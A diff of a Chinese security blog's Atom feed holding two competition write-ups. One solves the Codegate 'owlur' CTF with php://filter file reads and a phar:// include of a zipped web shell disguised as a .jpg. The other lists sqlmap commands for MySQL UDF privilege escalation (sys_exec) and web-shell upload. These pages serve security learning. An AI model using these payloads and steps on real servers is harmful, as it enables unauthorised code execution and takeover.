@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Security | Ourren]]></title>
   <link href="http://test.ourren.com/categories/security/atom.xml" rel="self"/>
   <link href="http://test.ourren.com/"/>
-  <updated>2015-03-17T14:34:06-07:00</updated>
+  <updated>2015-03-17T15:10:33-07:00</updated>
   <id>http://test.ourren.com/</id>
   <author>
     <name><![CDATA[ourren]]></name>
@@ -15,25 +15,23 @@
   
   <entry>
     <title type="html"><![CDATA[Phpar突破文件包含]]></title>
-    <link href="http://test.ourren.com/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <link href="http://test.ourren.com/2015/03/16/phpar%20include%20exploit/"/>
     <updated>2015-03-16T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2015/03/16/phpar突破文件包含</id>
+    <id>http://test.ourren.com/2015/03/16/phpar include exploit</id>
     <content type="html"><![CDATA[<p>Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过<a href="http://php.net/manual/zh/wrappers.php.php">php://filter</a>读取页面源文件，对php://filter不熟悉的可以研究下：</p>
 
 <pre><code>http://x/owlur/index.php?page=php://filter/convert.base64-encode/resource=upload
 http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
 </code></pre>
 
-
 <p>其中读取后的内容是经过编码了的，要看源码记得解码，比如rot13可以在Linux下：</p>
 
 <pre><code>cat 1.php | rot13
 </code></pre>
 
+<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：<!--more--></p>
 
-<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：</p>
-
-<pre><code><?php
+<pre><code>&lt;?php
 $p = $_REQUEST['page'];
 
 if($p == "" || $p == "index")
@@ -45,59 +43,57 @@ $haq = base64_decode("ICAgICAgICAgICAgICAgICAgIC8tLS0tLS0tLS0KICAgICAgICAgICAgIC
 $haq = htmlentities($haq);
 
 if(strstr($p,"..") !== FALSE)
-die("<pre>$haq</pre>&#8221;);
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
 
-if(stristr($p,&#8221;http&#8221;) !== FALSE)
-die(&#8221;<pre>$haq</pre>&#8221;);
+if(stristr($p,"http") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
 
-if(stristr($p,&#8221;ftp&#8221;) !== FALSE)
-die(&#8221;<pre>$haq</pre>&#8221;);
+if(stristr($p,"ftp") !== FALSE)
+die("&lt;pre&gt;$haq&lt;/pre&gt;");
 
-if(strlen($p) >= 60)
-die(&#8221;<pre>string > 60
-$haq</pre>&#8221;);
+if(strlen($p) &gt;= 60)
+die("&lt;pre&gt;string &gt; 60
+$haq&lt;/pre&gt;");
 
-$inc = sprintf(&#8220;%s.php&#8221;,$p);
+$inc = sprintf("%s.php",$p);
 
-?>
-<?php
+?&gt;
+&lt;?php
 include($inc);
-?>
+?&gt;
 </code></pre>
-
 
 <p>可以发现其实page参数可以控制，然后会在后面加一个包含的文件名后面加一个“.php”进行文件包含。</p>
 
 <p>另外而此程序可以上传图片，而上传时只能上传jpg图片，其实程序只检测了后缀是不是jpg结尾的，同时在另存为时程序会自动重命名：随机字符串*6.jpg，也就是说：</p>
 
-<pre><code>xxxx.jpg ---->randon.jpg
+<pre><code>xxxx.jpg ----&gt;randon.jpg
 </code></pre>
-
 
 <p>其实他没有检测该上传文件是否合法，所以原始文件可以上传上去的，只不过后缀给改为.jpg了。因此我们可以上传我们需要的文件，但是怎么进行包含，这个确实很考脑力：</p>
 
 <ul>
-    <li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
-    <li>不存在截断，因为php版本为：5.5.x；</li>
-    <li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
+<li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
+<li>不存在截断，因为php版本为：5.5.x；</li>
+<li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
 </ul>
 
 
 <p>查询PHP手册发现PHP支持如下的<a href="http://php.net/manual/en/wrappers.php">Wrappers</a>：</p>
 
 <ul>
-    <li>file:// — Accessing local filesystem</li>
-    <li>http:// — Accessing HTTP(s) URLs</li>
-    <li>ftp:// — Accessing FTP(s) URLs</li>
-    <li>php:// — Accessing various I/O streams</li>
-    <li>zlib:// — Compression Streams</li>
-    <li>data:// — Data (RFC 2397)</li>
-    <li>glob:// — Find pathnames matching pattern</li>
-    <li>phar:// — PHP Archive</li>
-    <li>ssh2:// — Secure Shell 2</li>
-    <li>rar:// — RAR</li>
-    <li>ogg:// — Audio streams</li>
-    <li>expect:// — Process Interaction Streams</li>
+<li>file:// — Accessing local filesystem</li>
+<li><a href="http://">http://</a> — Accessing HTTP(s) URLs</li>
+<li><a href="ftp://">ftp://</a> — Accessing FTP(s) URLs</li>
+<li>php:// — Accessing various I/O streams</li>
+<li>zlib:// — Compression Streams</li>
+<li>data:// — Data (RFC 2397)</li>
+<li>glob:// — Find pathnames matching pattern</li>
+<li>phar:// — PHP Archive</li>
+<li>ssh2:// — Secure Shell 2</li>
+<li>rar:// — RAR</li>
+<li>ogg:// — Audio streams</li>
+<li>expect:// — Process Interaction Streams</li>
 </ul>
 
 
@@ -107,13 +103,12 @@ include($inc);
 
 <p>果断下载一个backdoor，然后压缩为zip，然后修改后缀为.jpg，上传成功并得到目标文件地址，整个过程可以这样子描述：</p>
 
-<pre><code>phpspy.php->x.php->x.zip->x.jpg->upload->xsssa.jpg
+<pre><code>phpspy.php-&gt;x.php-&gt;x.zip-&gt;x.jpg-&gt;upload-&gt;xsssa.jpg
 </code></pre>
-
 
 <p>于是构造路径并通过phar://进行访问，你猜怎么着，居然成功了，顺利得到flag：</p>
 
-<p><a href="http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
+<p><a href="http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
 
 <p>其中O6i51MF.jpg是一个zip文件，里面有一个1.php的后门。后来听说zip://这样子也可以，so?</p>
 ]]></content>
@@ -121,60 +116,57 @@ include($inc);
   
   <entry>
     <title type="html"><![CDATA[Linux下MySQL Udf 提权]]></title>
-    <link href="http://test.ourren.com/2015/03/10/linux%E4%B8%8Bmysql-udf-%E6%8F%90%E6%9D%83/"/>
+    <link href="http://test.ourren.com/2015/03/10/linux%20mysql%20udf%20shell/"/>
     <updated>2015-03-10T00:00:00-07:00</updated>
-    <id>http://test.ourren.com/2015/03/10/linux下mysql-udf-提权</id>
+    <id>http://test.ourren.com/2015/03/10/linux mysql udf shell</id>
     <content type="html"><![CDATA[<p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>
 
-<h3 id="toc_1">具体步骤如下</h3>
-
+<h3>具体步骤如下</h3>
 
 <ol>
-    <li>找到MySQL插件目录:
-<pre><code>python sqlmap.py -u 'http://xxxx' --sql-shell
+<li><p>找到MySQL插件目录:</p>
 
-show variables like "%plugin%";
-</code></pre>
-</li>
-    <li>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib<em>mysqludf</em>sys</a>到MySQL插件目录;
-<pre><code>python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys 
---file-dest=/usr/lib/mysql/plugin/
-</code></pre>
-</li>
-    <li>激活存储过程「sys_exec」函数:
-<pre><code>python sqlmap.py -u 'http://xxxx' --sql-shell
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
 
-CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+ show variables like "%plugin%";
+</code></pre></li>
+<li><p>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib_mysqludf_sys</a>到MySQL插件目录;</p>
 
-SELECT * FROM information_schema.routines
+<pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
+ --file-dest=/usr/lib/mysql/plugin/
+</code></pre></li>
+<li><p>激活存储过程「sys_exec」函数:</p>
 
-sys_exec(id);
-</code></pre>
-</li>
-    <li>也利用sqlmap上传后门程序：
-<pre><code>python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
-</code></pre>
-</li>
+<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
+
+ CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+
+ SELECT * FROM information_schema.routines
+
+ sys_exec(id);
+</code></pre></li>
+<li><p>也利用sqlmap上传后门程序：</p>
+
+<pre><code> python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
+</code></pre></li>
 </ol>
 
 
-<h3 id="toc_2">测试环境</h3>
-
+<h3>测试环境</h3>
 
 <ul>
-    <li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
-    <li>PHP 5.3.5, Apache 2.2.17</li>
-    <li>MySQL 5.0</li>
+<li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
+<li>PHP 5.3.5, Apache 2.2.17</li>
+<li>MySQL 5.0</li>
 </ul>
 
 
-<h3 id="toc_3">参考资料</h3>
-
+<h3>参考资料</h3>
 
 <ol>
-    <li>http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</li>
-    <li>https://github.com/mysqludf/lib<em>mysqludf</em>sys</li>
-    <li>https://code.google.com/p/mysql-udf-http/</li>
+<li><a href="http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html">http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</a></li>
+<li><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></li>
+<li><a href="https://code.google.com/p/mysql-udf-http/">https://code.google.com/p/mysql-udf-http/</a></li>
 </ol>
 
 ]]></content>
